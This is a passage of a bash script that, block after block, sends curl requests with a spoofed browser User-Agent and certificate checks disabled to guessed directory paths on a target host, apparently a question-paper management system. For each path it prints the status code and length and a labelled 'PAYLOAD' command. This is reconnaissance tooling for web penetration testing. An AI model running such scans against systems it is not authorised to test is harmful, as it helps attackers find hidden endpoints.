         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowHandlingModule/"" -H "User-Agent: Mozilla/5.0")
